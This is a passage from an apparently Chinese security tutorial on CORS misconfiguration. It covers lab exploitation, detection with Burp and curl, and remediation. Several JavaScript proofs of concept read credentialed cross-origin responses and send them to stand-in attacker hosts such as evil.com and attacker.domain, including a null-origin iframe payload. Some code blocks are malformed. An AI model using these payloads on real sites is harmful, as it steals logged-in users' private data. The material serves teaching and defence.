<span class="language-javascript"><span class="language-xml">            xhr2.<span class="hljs-title function_">send</span>(<span class="hljs-string">"T1="</span>+<span class="hljs-built_in">escape</span>(datas));      </span></span>
<span class="language-javascript"><span class="language-xml">        }</span></span>
<span class="language-javascript"><span class="language-xml">    }</span></span>
<span class="language-javascript"><span class="language-xml">    xhr1.<span class="hljs-title function_">open</span>(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"http://foo.com/phpinfo.php"</span>,<span class="hljs-string">"true"</span>) <span class="hljs-comment">//request user page.</span></span></span>
<span class="language-javascript"><span class="language-xml">    <span class="hljs-title function_">alert</span>(xhr1.<span class="hljs-property">responseText</span>);</span></span>
<span class="language-javascript"><span class="language-xml">	xhr1.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;        <span class="hljs-comment">//request with cookie</span></span></span>
<span class="language-javascript"><span class="language-xml">    xhr1.<span class="hljs-title function_">send</span>();</span></span>
<span class="language-javascript"><span class="language-xml">}</span></span>
<span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">loadXMLDoc</span>();</span></span>
<span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre>
<p>当用户点开此网页时，由evil.com通过AJAX发出一个向foo.com的资源请求，所以浏览器自动添加了Origin字段。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151845461.png" alt="image-20230508151845461"></p>
<p>接下来黑客将获取到的敏感信息POST提交到save.php中，而save.php将数据保存在phpinfo.html里。<a target="_blank" rel="noopener" href="http://evil.com/save.php%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B%EF%BC%9A">evil.com/save.php代码如下：</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151857434.png" alt="image-20230508151857434"></p>
<p>黑客的请求流程是steal.html-&gt;phpinfo.php-&gt;save.php。我们通过BurpSuite的Repeater功能重放抓到的phpinfo.php请求包可以发现响应包是含有返回内容的，也就是请求到的资源。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151911805.png" alt="image-20230508151911805"></p>
<p>但是在save.php中并没有返回的资源，通过检查浏览器的控制台提示信息发现，由于响应包缺少Access-Control-Allow-Origin响应头，导致浏览器拦截了跨源请求。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151924149.png" alt="image-20230508151924149"></p>
<p><a target="_blank" rel="noopener" href="http://xn--foo-du3eo63e.com/phpinfo.php%E6%9C%8D%E5%8A%A1%E7%AB%AF%E7%9A%84%E6%B3%A8%E9%87%8A">去掉foo.com/phpinfo.php服务端的注释</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151935869.png" alt="image-20230508151935869"></p>
<p>重新访问<a target="_blank" rel="noopener" href="http://evil.com/steal.html">http://evil.com/steal.html</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508151947727.png" alt="image-20230508151947727"></p>
<p>发现响应包中出现了对应的CORS响应头，Access-Control-Allow-Origin指是允许访问的源，Access-Control-Allow-Credentials指的是允许带上cookie访问资源。这样浏览器就不会出错而拦截请求了，<a target="_blank" rel="noopener" href="http://xn--jsevil-qr3js1ivpc1091bvvlsk7cgzuc3ggq8dzjxayjdjxg.com/save.php%E5%8E%BB">随后js脚本把页面编码后发送到evil.com/save.php去</a><br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508152005865.png" alt="image-20230508152005865"></p>
<p><a target="_blank" rel="noopener" href="http://xn--evil-4h9gr48auxmfr9dnft6ju.com/phpinfo.html%E9%A1%B5%E9%9D%A2%EF%BC%8C%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E5%B7%B2%E7%BB%8F%E8%A2%AB%E7%AA%83%E5%8F%96%E8%BF%87%E6%9D%A5%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E3%80%82%E8%87%B3%E6%AD%A4%E6%88%90%E5%8A%9F%E5%88%A9%E7%94%A8CORS%E6%BC%8F%E6%B4%9E%E8%BF%9B%E8%A1%8C%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AE%BF%E9%97%AE%E3%80%82">模拟黑客访问evil.com/phpinfo.html页面，可以发现已经被窃取过来的敏感信息。至此成功利用CORS漏洞进行跨域资源访问。</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508152019446.png" alt="image-20230508152019446"></p>
<h2 id="0x04-修复及防御方式">0x04 修复及防御方式</h2>
<pre><code class="hljs plaintext">1.仔细评估是否开启CORS，如果不必要就不要开启CORS

2.如果是绝对必要的话，要定义“源”的白名单。尽量不使用正则表达式配置，不要配置“Access-Contol-Allow-Origin”为通配符“*”，同时严格校验来自请求的Origin值。

3.仅仅允许安全的协议，有必要验证协议以确保不允许来自不安全通道（HTTP）的交互，否则中间人(MitM)将绕过应用是所使用的HTTPS

4.要尽可能的返回"Vary: Origin"这个头部，以避免攻击者利用浏览器缓存

5.如果可能的话避免使用“Credentials”头，由于“Access-Control-Allow-Credentials”标头设置为“true”时允许跨域请求中带有凭证数据，因此只有在严格必要时才应配置它。此头部也增加了CSRF攻击的风险;因此，有必要对其进行保护。

6.限制使用的方法，通过“Access-Control-Allow-Methods”头部，还可以配置允许跨域请求的方法，这样可以最大限度地减少所涉及的方法。

7.限制缓存的时间，通过“Access-Control-Allow-Methods”和“Access-Control-Allow-Headers”头部，限制浏览器缓存信息的时间。可以通过使用“Access-Control-Max-Age”标题来完成，该头部接收时间数作为输入，该数字是浏览器保存缓存的时间。配置相对较低的值（例如大约30分钟），确保浏览器在短时间内可以更新策略（比如允许的源）。

8.仅配置所需要的头，仅在接收到跨域请求的时候才配置有关于跨域的头部，并且确保跨域请求是合法的（只允许来自合法的源）。</code></pre>
<h2 id="0x05-简单请求的示例">0x05 简单请求的示例</h2>
<p>跨域资源共享（CORS）规范规定了在Web服务器和浏览器之间交换的标头内容，该标头内容限制了源域之外的域请求web资源。CORS规范标识了协议头中Access-Control-Allow-Origin最重要的一组。当网站请求跨域资源时，服务器将返回此标头，并由浏览器添加标头Origin。<br>
例如下面的来自站点 <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a> 的网页应用想要访问 <a target="_blank" rel="noopener" href="http://bar.com/">http://bar.com</a> 的资源：</p>
<p><strong>requests</strong></p>
<pre><code class="hljs http">1  GET /resources/public-data/ HTTP/1.1
2  Host: bar.com
3  User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081130 Minefield/3.1b3pre
4  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
5  Accept-Language: en-us,en;q=0.5
6  Accept-Encoding: gzip,deflate
7  Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
8  Connection: keep-alive
9  Referer: http://example.com/examples/access-control/simpleXSInvocation.html
10 Origin: http://example.com</code></pre>
<p><strong>response</strong></p>
<pre><code class="hljs http">11  HTTP/1.1 200 OK
12  Date: Mon, 01 Dec 2020 00:23:53 GMT
13  Server: Apache/2.0.61 
14  Access-Control-Allow-Origin: *
15  Keep-Alive: timeout=2, max=100
16  Connection: Keep-Alive
17  Transfer-Encoding: chunked
18  Content-Type: application/xml</code></pre>
<p>第 1~9 行是请求首部。在第10行的请求头 Origin 表明该请求来源于 <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a>。<br>
第 11~18 行是来自于 <a target="_blank" rel="noopener" href="http://bar.com/">http://bar.com</a> 的服务端响应。响应中携带了响应首部字段 Access-Control-Allow-Origin（第 14 行）。使用 Origin 和 Access-Control-Allow-Origin 就能完成最简单的访问控制。本例中，服务端返回的 Access-Control-Allow-Origin: * 表明，该资源可以被任意外域访问。如果服务端仅允许来自 <a target="_blank" rel="noopener" href="http://example.com/">http://example.com</a> 的访问，该首部字段的内容如下：<br>
<code>Access-Control-Allow-Origin: http://example.com</code><br>
如果跨域请求可以包含cookie的话，在服务器响应里应该有这一字段：<br>
<code>Access-Control-Allow-Credentials: true</code><br>
这样的话攻击者就可以利用这个漏洞来窃取已经在这个网站上登录了的用户的信息（利用cookie）</p>
<h2 id="0x06-漏洞利用">0x06 漏洞利用</h2>
<p>这里以droabox靶场为例</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508155343507.png" alt="image-20230508155343507"></p>
<p>这个接口会返回已登录的用户的信息数据，通过访问该网页的响应我们看到这里可能存在CORS跨域资源共享漏洞</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508155355927.png" alt="image-20230508155355927"></p>
<p>接下来我们就可以建立一个恶意的js代码</p>
<pre><code class="hljs js">&lt;!-- cors.<span class="hljs-property">html</span> --&gt;
&lt;!<span class="hljs-variable constant_">DOCTYPE</span> html&gt;
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span>
<span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>cors exp<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text/javascript"</span>&gt;</span><span class="language-javascript"></span></span>
<span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">function</span> <span class="hljs-title function_">cors</span>(<span class="hljs-params"></span>) {  </span></span>
<span class="language-javascript"><span class="language-xml"><span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();  </span></span>
<span class="language-javascript"><span class="language-xml">xhttp.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) {    </span></span>
<span class="language-javascript"><span class="language-xml">    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">status</span> == <span class="hljs-number">200</span>) {    </span></span>
<span class="language-javascript"><span class="language-xml">    <span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>);     </span></span>
<span class="language-javascript"><span class="language-xml">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"demo"</span>).<span class="hljs-property">innerHTML</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">responseText</span>;    <span class="hljs-comment">//作用解释如下</span></span></span>
<span class="language-javascript"><span class="language-xml">    }  </span></span>
<span class="language-javascript"><span class="language-xml">};  </span></span>
<span class="language-javascript"><span class="language-xml">xhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"http://192.168.0.101/DoraBox/csrf/userinfo.php"</span>);  </span></span>
<span class="language-javascript"><span class="language-xml">xhttp.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;  </span></span>
<span class="language-javascript"><span class="language-xml">xhttp.<span class="hljs-title function_">send</span>();</span></span>
<span class="language-javascript"><span class="language-xml">}</span></span>
<span class="language-javascript"><span class="language-xml"><span class="hljs-title function_">cors</span>();</span></span>
<span class="language-javascript"><span class="language-xml"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span>
<span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span></code></pre>
<pre><code class="hljs plaintext">//document.getElementById("demo").innerHTML = this.responseText;
这段代码的作用是将 this.responseText 的内容设置为具有 id "demo" 的元素的内部 HTML。

具体解释如下：

document.getElementById("demo") 是一个 DOM 方法，它通过元素的 id 属性获取对应的 HTML 元素。在这个例子中，它获取具有 id "demo" 的元素。

.innerHTML 是获取或设置 HTML 元素的内部 HTML 内容的属性。通过将等号右侧的值赋给它，可以更新元素的内部 HTML 内容。
this.responseText 是 XMLHttpRequest 对象的属性，它包含从服务器返回的响应文本。

因此，这行代码的作用是将服务器返回的响应文本（this.responseText）设置为具有 id "demo" 的元素的内部 HTML 内容。这样，在网页中具有 id "demo" 的元素会显示服务器返回的文本内容。</code></pre>
<p>访问这个页面就可以获取已登录的用户的信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230508155432545.png" alt="image-20230508155432545"></p>
<p>该恶意代码首先定义一个函数cors，以get形式访问目标网址，创建XMLHttpRequest对象为xhttp，通过ajax的onreadystatechange判断请求状态，如果请求已完成，且相应已就绪，则弹出返回文本。</p>
<h2 id="0x07-漏洞发现技巧">0x07 漏洞发现技巧</h2>
<p>在之前我们了解了一些关于CORS跨域资源共享通信的一些字段含义，<br>
CORS的漏洞主要看当我们发起的请求中带有Origin头部字段时，服务器的返回包带有CORS的相关字段并且允许Origin的域访问。</p>
<h5 id="方式一-burpsuite">方式一: BurpSuite</h5>
<p>一般测试WEB漏洞都会用上BurpSuite，而BurpSuite可以实现帮助我们检测这个漏洞。<br>
<strong>方式一: 首先是自动在HTTP请求包中加上Origin的头部字段，打开BurpSuite，选择Proxy模块中的Options选项，找到Match and Replace这一栏，勾选Request header 将空替换为Origin:example.com的Enable框。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230510210647354.png" alt="image-20230510210647354"></p>
<p><strong>在Filter by search term 中输入：Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="http://foo.example.org">foo.example.org</a></strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230510210756718.png" alt="image-20230510210756718"></p>
<p><strong>HTTP history列表中出现符合条件的请求包，点击Ctrl+R，点击GO，如下图，即该处有CORS漏洞。</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230510210834463.png" alt="image-20230510210834463"></p>
<p>组合应是这种：</p>
<pre><code class="hljs yaml"><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">foo.example.org</span>
<span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span></code></pre>
<p>注意！如下组合是没有漏洞的。因为浏览器已经会阻止如下配置。</p>
<pre><code class="hljs yaml"><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">*</span>
<span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span></code></pre>
<p>当我们进行测试时，看服务器响应头字段里可以关注这几个点：<br>
<code>最好利用的配置：</code><br>
Access-Control-Allow-Origin: <a target="_blank" rel="noopener" href="https://attacker.com/">https://attacker.com</a><br>
Access-Control-Allow-Credentials: true<br>
<code>可能存在可利用的配置：</code><br>
Access-Control-Allow-Origin: null<br>
Access-Control-Allow-Credentials: true<br>
<code>很好的条件但无法利用：</code><br>
下面这组配置组合虽然看起来很完美但是CORS机制已经默认自动禁止了这种组合，算是CORS的最后一道防线<br>
Access-Control-Allow-Origin: *<br>
Access-Control-Allow-Credentials: true<br>
<code>单一的情况</code></p>
<h5 id="方式二-access-control-allow-origin">方式二: Access-Control-Allow-Origin：</h5>
<p>curl命令，输入<code>curl http://127.0.0.1/DoraBox-master/csrf/userinfo.php -H "Origin:https://example.com/" -I</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230510211118635.png" alt="image-20230510211118635"></p>
<p>如果出现这种组合，说明存在CORS漏洞</p>
<pre><code class="hljs yaml"><span class="hljs-attr">Access-Control-Allow-Origin:</span> <span class="hljs-string">foo.example.org</span>
<span class="hljs-attr">Access-Control-Allow-Credentials:</span> <span class="hljs-literal">true</span></code></pre>
<h5 id="方式三-使用corscanner工具漏洞自动化扫描">方式三: 使用CORScanner工具(漏洞自动化扫描)</h5>
<p>github上提供了一个关于扫描CORS配置漏洞的脚本<br>
<a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a><br>
CORScanner是一个python工具，旨在发现网站的CORS错误配置漏洞。它可以帮助网站管理员和渗透测试人员检查他们针对的域/ URL是否具有不安全的CORS策略。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230510211631525.png" alt="image-20230510211631525"></p>
<p><strong>总结漏洞的原因：</strong><br>
1：CORS服务端的 Access-Control-Allow-Origin 设置为了 *，并且 Access-Control-Allow-Credentials 设置为false，这样任何网站都可以获取该服务端的任何数据了。<br>
2：有一些网站的Access-Control-Allow-Origin他的设置并不是固定的，而是根据用户跨域请求数据的Origin来定的。这时，不管Access-Control-Allow-Credentials 设置为了 true 还是 false。任何网站都可以发起请求，并读取对这些请求的响应。意思就是任何一个网站都可以发送跨域请求来获得CORS服务端上的数据。</p>
<p><strong>安全隐患</strong><br>
这个流程中。服务器接收到跨域请求的时候，并没有先验证，而是先处理了请求。所以从某种程度上来说。在支持CORS的浏览器上实现跨域的写资源，打破了传统同源策略下不能跨域读写资源。</p>
<p>如果将Access-Control-Allow-Origin设置为允许来自所有域的跨域请求。那么CORS的安全机制几乎就无效了。但是这里在设计的时候有一个很好的限制。xmlhttprequest发送的请求需要使用“withCredentials”来带上cookie，如果一个目标域设置成了允许任意域的跨域请求，这个请求又带着cookie的话，这个请求是不合法的。<strong>（就是如果需要实现带cookie的跨域请求，需要明确的配置允许来源的域，使用任意域的配置是不合法的）浏览器会屏蔽掉返回的结果。</strong></p>
<h2 id="0x08-其他可能利用漏洞的地方">0x08 其他可能利用漏洞的地方</h2>
<h4 id="81-解析origin头时出错">8.1 解析Origin头时出错</h4>
<p>一些支持从多个来源进行访问的应用程序通过使用允许的来源白名单来实现。收到CORS请求后，会将提供的来源与白名单进行比较。如果来源出现在白名单中，那么它会反映在Access-Control-Allow-Origin标题中，以便授予访问权限。例如，web应用收到一个正常的请求：</p>
<pre><code class="hljs plaintext">GET /data HTTP/1.1
Host: bar.com
...
Origin: https://example.com</code></pre>
<p>web应用根据其允许的来源列表检查当前请求资源的来源，如果在列表中，则按以下方式反映该来源：</p>
<pre><code class="hljs plaintext">HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com</code></pre>
<p>但在检测来源是否存在于白名单时经常可能出现问题，一些网站可能会允许其所有的子域（包括尚未存在未来可能存在的子域）来进行访问，或者允许其他网站的域以及其子域来访问请求。这些请求一般都通过通配符或者正则表达式来完成，但是如果这其中出现错误可能就会导致给予其他未被授权的域访问权限。例如：<br>
例如，假设一个应用程序授予对以下列结尾的所有域的访问权限：<br>
<a target="_blank" rel="noopener" href="http://example.com">example.com</a><br>
攻击者可能可以通过注册域来获得访问权限：<br>
<a target="_blank" rel="noopener" href="http://exeexample.com">exeexample.com</a><br>
或者，假设应用程序授予对所有以example.com开头的域访问权限，攻击者就可以使用该域获得访问权限：<br>
<a target="_blank" rel="noopener" href="http://example.com.evil-user.net">example.com.evil-user.net</a></p>
<h4 id="82-利用相互受cors信任的域来进行xss">8.2 利用相互受CORS信任的域来进行XSS</h4>
<p>假如两个互相受信任的源，如果其中一个网站存在XSS，攻击者就可以利用XSS注入一些JavaScript代码，利用这些代码对信任其源的另一个网站进行敏感信息的获取。<br>
如果进行CORS请求时网站响应：</p>
<pre><code class="hljs plaintext">HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://vulnerable.com
Access-Control-Allow-Credentials: true</code></pre>
<p>就可以利用XSS漏洞在vulnerable.com网站上使用下面的URL来通过检索API密钥：<br>
<code>https://vulnerable.com/?xss=&lt;script&gt;cors-stuff-here&lt;/script&gt;</code></p>
<h4 id="83-白名单中的null值">8.3 白名单中的null值</h4>
<p>CORS协议的一个重要安全前提是跨域请求中的Origin头不能被伪造，这个前提并不是总是成立。Origin头最早被提出用于防御CSRF攻击，它的语法格式在RFC 6564中被定义。RFC 6564规定，如果请求来自隐私敏感上下文时，Origin头的值应该为null，但是它却没有明确界定什么是隐私敏感上下文。</p>
<p>CORS协议复用了Origin头，但在CORS标准中同样缺乏对跨域请求Origin中null明确的定义和限制。有些开发者在网站上配置信任 null，用于与本地file页面共享数据，如下所示：<br>
Access-Control-Allow-Origin: null<br>
Access-Control-Allow-Credentials: true<br>
在这种情况下，攻击者可以使用各种技巧来生成跨域请求，该请求构造的Origin为null值。这将满足白名单的要求，从而导致跨域访问。例如，可以使用iframe以下格式的沙盒跨域请求来完成：</p>
<pre><code class="hljs js">&lt;iframe sandbox=<span class="hljs-string">"allow-scripts allow-top-navigation allow-forms"</span> src=<span class="hljs-string">"data:text/html,&lt;script&gt;</span>
<span class="hljs-string">var req = new XMLHttpRequest();</span>
<span class="hljs-string">req.onload = reqListener();</span>
<span class="hljs-string">req.open('get','vulnerable-website.com/sensitive-victim-data',true);</span>
<span class="hljs-string">req.withCredentials = true;</span>
<span class="hljs-string">req.send();</span>
<span class="hljs-string"></span>
<span class="hljs-string">function reqListener() {</span>
<span class="hljs-string">location='malicious-website.com/log?key='+this.responseText;</span>
<span class="hljs-string">};</span>
<span class="hljs-string">&lt;/script&gt;"</span>&gt;
&lt;/iframe&gt;</code></pre>
<p>这就意味着任何配置有<code>Access-Control-Allow-Origin: null</code>和<code>Access-Control-Allow-Credentials:true</code>的网站等同于没有浏览器SOP的保护，都可以被其他任意域以这种方式读取内容。</p>
<h2 id="0x09-利用cors漏洞偏实际环境">0x09 利用CORS漏洞(偏实际环境)</h2>
<p>流程:</p>
<ol>
<li><a target="_blank" rel="noopener" href="http://xn--CORSvuln-z09lrnj2rtqnu49bydof43c9oejpwl4szpaf74reoya6hy.com">假设用户登陆一个含有CORS配置网站vuln.com</a>，<a target="_blank" rel="noopener" href="http://xn--evil-k84fui0wi3eluix9emvas11m4pa17nc6ct30ix07a1d7bhzxb45d.com">同时又访问了攻击者提供的一个链接evil.com</a>。</li>
<li>evil.com的网站向vuln.com这个网站发起请求获取敏感数据，浏览器能否接收信息取决于vuln.com的配置。</li>
<li>如果vuln.com配置了Access-Control-Allow-Origin头且为允许接收，否则浏览器会因为同源策略而不接收。</li>
</ol>
<h4 id="方式一存在用户凭证">方式一：存在用户凭证</h4>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230510212141252.png" alt="image-20230510212141252"></p>
<p><strong>详细过程</strong></p>
<ol>
<li>
<p>创建一个JavaScript脚本去发送CORS请求，poc关键代码如下：</p>
<pre><code class="hljs js">   <span class="hljs-keyword">var</span> req = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>(); 
   req.<span class="hljs-property">onload</span> = <span class="hljs-title function_">reqListener</span>(); 
   req.<span class="hljs-title function_">open</span>(“get”,”<span class="hljs-attr">https</span>:<span class="hljs-comment">//vulnerable.domain/api/private-data”,true); </span>
   req.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;
   req.<span class="hljs-title function_">send</span>(); 
   <span class="hljs-keyword">function</span> <span class="hljs-title function_">reqListener</span>(<span class="hljs-params"></span>) { 
   location=”<span class="hljs-comment">//attacker.domain/log?response=”+this.responseText; </span>
   };

<span class="hljs-number">2.</span> 当带有目标系统的用户访问的主机访问上述代码的页面时，浏览器就会发送下面的请求到存在<span class="hljs-variable constant_">CORS</span>配置的服务器。

<span class="hljs-string">``</span><span class="hljs-string">`http</span>
<span class="hljs-string">GET /api/private-data HTTP/1.1 </span>
<span class="hljs-string">Host: vulnerable.domain </span>
<span class="hljs-string">Origin: https://attacker.domain/ </span>
<span class="hljs-string">Cookie: JSESSIONID=&lt;redacted&gt;</span>
<span class="hljs-string">`</span><span class="hljs-string">``</span>

<span class="hljs-number">3.</span> 响应包

<span class="hljs-string">``</span><span class="hljs-string">`http</span>
<span class="hljs-string">HTTP/1.1 200 OK </span>
<span class="hljs-string">Server: Apache-Coyote/1.1 </span>
<span class="hljs-string">Access-Control-Allow-Origin: https://attacker.domain </span>
<span class="hljs-string">Access-Control-Allow-Credentials: true </span>
<span class="hljs-string">Access-Control-Expose-Headers: Access-Control-Allow-Origin,Access-Control-Allow-Credentials </span>
<span class="hljs-string">Vary: Origin </span>
<span class="hljs-string">Expires: Thu, 01 Jan 1970 12:00:00 GMT </span>
<span class="hljs-string">Last-Modified: Wed, 02 May 2018 09:07:07 GMT </span>
<span class="hljs-string">Cache-Control: no-store, no-cache, must-revalidate, max-age=0, post-check=0, pre-check=0 </span>
<span class="hljs-string">Pragma: no-cache </span>
<span class="hljs-string">Content-Type: application/json;charset=ISO-8859-1 </span>
<span class="hljs-string">Date: Wed, 02 May 2018 09:07:07 GMT </span>
<span class="hljs-string">Connection: close </span>
<span class="hljs-string">Content-Length: 149 {"id":1234567,"name":"Name","surname":"Surname","email":"email@target.local","account":"ACT1234567","balance":"123456,7","token":"to p-secret-string"}</span>
<span class="hljs-string">`</span><span class="hljs-string">``</span>

<span class="hljs-number">3.</span> 因为服务器发送了右边的“ <span class="hljs-title class_">Access</span>-<span class="hljs-title class_">Control</span>-<span class="hljs-title class_">Allow</span>- *”给客户端，所以，攻击的浏览器允许包含恶意的<span class="hljs-title class_">JavaScript</span>代码的页面访问用户的隐私数据。

#### 方式二：不存在用户凭证

![image-<span class="hljs-number">20230510212310583</span>](<span class="hljs-variable constant_">CORS</span>跨域漏洞/image-<span class="hljs-number">20230510212310583.</span>png)

**详细过程**

<span class="hljs-number">1.</span> 攻击方式<span class="hljs-number">1</span>：绕过基于<span class="hljs-variable constant_">IP</span>的认证
   如果目标应用程序与受害者的网络可达性，并且目标应用程序使用<span class="hljs-variable constant_">IP</span>地址作为身份验证的方式，则黑客会利用受害者的浏览器作为代理去访问那些目标应用程序并且可以绕过那些基于<span class="hljs-variable constant_">IP</span>的身份验证。
<span class="hljs-number">2.</span> 攻击方式<span class="hljs-number">2</span>：客户端缓存中毒
   例如，数据报文头部中包含<span class="hljs-string">`X-User`</span>标头，其值未进行任何输入验证，输出编码。
   请求包

<span class="hljs-string">``</span><span class="hljs-string">`http</span>
<span class="hljs-string">GET /login HTTP/1.1 </span>
<span class="hljs-string">Host: www.target.local </span>
<span class="hljs-string">Origin: https://attacker.domain/ </span>
<span class="hljs-string">X-User: &lt;svg/onload=alert(1)&gt;</span>
<span class="hljs-string">`</span><span class="hljs-string">``</span>

响应包
<span class="hljs-string">`Access-Control-Allow-Origin`</span>已被设置，<span class="hljs-string">`Access-Control-Allow-Credentials: true`</span>与<span class="hljs-string">`Vary: Origin`</span>头适合设置

<span class="hljs-string">``</span><span class="hljs-string">`http</span>
<span class="hljs-string">HTTP/1.1 200 OK </span>
<span class="hljs-string">Access-Control-Allow-Origin: https://attacker.domain/ </span>
<span class="hljs-string">… </span>
<span class="hljs-string">Content-Type: text/html </span>
<span class="hljs-string">… </span>
<span class="hljs-string">Invalid user: &lt;svg/onload=alert(1)&gt;</span>
